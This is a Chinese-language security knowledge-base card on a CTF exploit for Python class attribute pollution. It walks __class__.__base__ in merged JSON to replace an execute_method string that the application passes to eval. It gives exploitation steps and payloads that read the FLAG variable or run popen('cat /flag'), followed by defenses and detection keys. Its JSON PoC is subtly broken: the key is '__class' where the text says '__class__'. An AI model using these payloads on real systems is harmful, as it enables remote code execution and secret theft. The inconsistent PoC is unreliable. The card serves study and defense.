---
id: web-python-class-pollution-execute-method-eval
title: Python 类属性污染：__class__.__base__ 注入 execute_method 经 eval 执行
type: scenario
domain: web
path: web/python
technique: class-pollution-execute-method-eval
tags:
- python
- class-pollution
- attribute-pollution
- prototype-pollution
- dunder
- eval
- rce
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:49+08:00'
  notes: 已对照原文 payload 与 eval 片段核对；原文未展示完整 merge 函数，卡片已注明推断；PoC 未复跑。
url: /docs/web/python/web-python-class-pollution-execute-method-eval/
draft: false
kb_aliases:
- Python 类污染 execute_method
- __class__.__base__ 属性注入
- eval(method) 执行
- 百年继承
- 继承链属性污染
---

## 一句话结论

当应用把用户 JSON 递归合并/赋值到对象属性、且不拦截 `__class__` 等 dunder 键时，可以从任意实例沿 `__class__.__base__.__base__` 走到祖先类，把 `execute_method` 改成一段字符串；业务随后 `getattr(self, "execute_method")` 并用 `eval(method)(...)` 调用，字符串被 `eval` 成 lambda 执行任意代码。

## 原理

- Python 实例的属性查找顺序是“实例 `__dict__` → 类 `__dict__` → MRO 父类”。修改祖先类的类属性后，所有未在实例上遮蔽该属性的对象都会读到新值。
- 递归合并/赋值逻辑通常对每个 key 判断 `hasattr(dst, key)`，为真且 value 是 dict 就 `getattr(dst, key)` 继续递归，否则 `setattr(dst, key, value)`。Python 对象天然拥有 `__class__`、`__base__` 等属性，`hasattr` 返回真，递归就会从实例进入类对象、再进入父类。
- 本题继承关系为 `Colonel(Father)`、`Father(Human)`、`ExecutionSquad(Human)`；对 Colonel 实例提交 `{"__class__":{"__base__":{"__base__":{...}}}}`，会依次到达 Colonel 类、Father 类、Human 类，最终在 Human 上 `setattr`。`execute_method` 原本定义在 Human 上（执行处决的 lambda），被覆盖后 Colonel/ExecutionSquad 等所有子类实例都继承新值。
- 业务代码 `method = getattr(self, "execute_method", None); result = eval(method)(executor=self, target=target)[2]` 把取到的属性当源码 `eval`。攻击者把 `execute_method` 设为字符串 `"lambda executor, target: (1, 1, __import__('os').getenv('FLAG'))"`，`eval` 得到 lambda，调用后返回三元组，`[2]` 取出环境变量 FLAG。
- 原逻辑的三元组是 `(target.__del__(), setattr(target,'alive',False), '处决成功')`，第三个元素是字符串结果；攻击者只需把第三个元素换成任意表达式，前两个元素用 `1,1` 占位即可。
- 根因是“用户可控的嵌套键可以触达 dunder 属性”与“把可写属性当代码执行”叠加；即使没有 `eval`，类属性污染也可用于提权、改配置或覆盖安全检查。

## 触发条件

- 应用存在把用户 JSON 递归合并到对象/类属性的入口，合并逻辑使用 `hasattr`/`getattr`/`setattr`，且不拒绝 `__` 开头/结尾的键。
- 目标对象所属类存在可被覆盖且会被业务读取的属性（如 `execute_method`、`is_admin`、配置项）。
- 业务在读取该属性后执行 `eval`/`exec`/`getattr` 调用/命令拼接等危险操作。
- 攻击者能控制 JSON 的嵌套结构，且合并后的对象在后续请求/同一请求内被使用。

## 利用步骤

1. 找到接受嵌套 JSON 的资料更新/合并接口，确认写入会递归进入对象属性（可先用普通字段验证）。
2. 探测继承链：提交 `{"__class__":{}}` 观察是否进入类对象；结合源码确认 `__base__` 层数与目标属性所在类。
3. 构造 payload，把 `execute_method` 设为返回 flag/命令结果的 lambda 字符串：
   `{"__class__":{"__base__":{"__base__":{"execute_method":"lambda executor, target: (1, 1, __import__('os').getenv('FLAG'))"}}}}`
4. 触发业务中读取 `execute_method` 并 `eval` 的流程（如“处决”动作），观察返回值/命令输出。
5. 若 `getenv` 不可用，把 lambda 换成 `__import__('os').popen('cat /flag').read()`、`open('/flag').read()` 等；若返回值不回显，用副作用（写文件、外带）观察。

## PoC

```json
{
  "__class": {
    "__base__": {
      "__base__": {
        "execute_method": "lambda executor, target: (1, 1, __import__('os').getenv('FLAG'))"
      }
    }
  }
}
```

关键业务代码（示意）：

```python
method = getattr(self, "execute_method", None)
result = eval(method)(executor=self, target=target)[2]
print(result)  # 返回 lambda 第三个元素，即环境变量 FLAG
```

类关系（示意）：

```python
class Human:
    execute_method = "lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')"

class Father(Human): ...
class ExecutionSquad(Human): ...
class Colonel(Father): ...
```

## 变体与关联

- 变体：污染目标换成 `is_admin`、`role`、`credit`、命令白名单、模板路径等；即使不 RCE，也可提权/改业务状态。
- 变体：起点用 `__class__.__mro__`、`__bases__`、`__init__.__globals__`、`__dict__`；拿到模块 globals 后可改 `os.environ`、`sys.path`、Flask `secret_key`。
- 变体：属性值不是字符串而是对象/列表时，可污染 `__globals__` 中的可变字典，或污染类方法指向可调用对象。
- 关联：[[web-python-recursive-merge-class-pollution-globals-rce]]（递归合并类污染到 globals/Flask secret_key）、[[web-python-pydash-set-attribute-path-pollution]]（点分路径属性污染）、[[web-nodejs-prototype-pollution-merge-json-parse]]（JS 原型链污染的对应模式）。
- 边界：合并逻辑拒绝 `__` 键、使用不可变类型/`__slots__`、属性只读、或读取属性后不做 `eval` 时，本链不成立；不同进程/worker 内存不共享，污染只影响当前进程。原文只给出 payload 与关键 `eval` 调用，完整合并函数未展示，合并语义按递归 `hasattr`/`setattr` 推断。

## 检测与防御

- 根除：不要用通用递归合并处理用户 JSON；改为显式字段白名单映射，丢弃未声明字段（Pydantic 模型、DTO）。
- 若必须递归：拒绝所有 `__` 开头/结尾的键，限制嵌套深度与值类型；黑名单只是兜底。
- 不要把用户可写属性当代码执行：禁止 `eval`/`exec` 用户可控字符串，使用 `ast.literal_eval`、白名单函数表或受限表达式引擎。
- 隔离敏感类属性：权限/配置/命令白名单使用不可变常量或每次从受保护存储读取，不要放在可被 `setattr` 的类属性上。
- 检测：请求体中出现 `__class__`、`__base__`、`__bases__`、`__mro__`、`__dict__`、`__globals__` 等键；合并入口收到含双下划线的字段名；业务读取的属性值突然变成字符串/lambda；`eval` 附近出现异常表达式。
